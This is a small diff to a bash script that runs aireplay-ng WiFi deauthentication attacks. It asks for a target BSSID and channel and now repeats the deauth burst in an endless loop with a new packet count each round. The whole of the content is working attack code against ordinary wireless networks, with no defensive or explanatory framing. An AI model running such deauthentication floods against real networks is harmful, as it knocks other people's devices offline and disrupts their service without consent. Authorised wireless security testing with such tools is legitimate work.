@@ -10,8 +10,10 @@ fi
 
 read -p "bssid?: " bssid
 read -p "channel?: " channel
-read -p "count?: " count
 
-sudo iwconfig $INTERFACE channel $channel
-sleep 3
-sudo aireplay-ng -0 $count -a "$bssid" "$INTERFACE"
+while true; do
+	read -p "count? (ctrl+c to exit): " count
+	sudo iwconfig $INTERFACE channel $channel
+	sleep 3
+	sudo aireplay-ng -0 $count -a "$bssid" "$INTERFACE"
+done
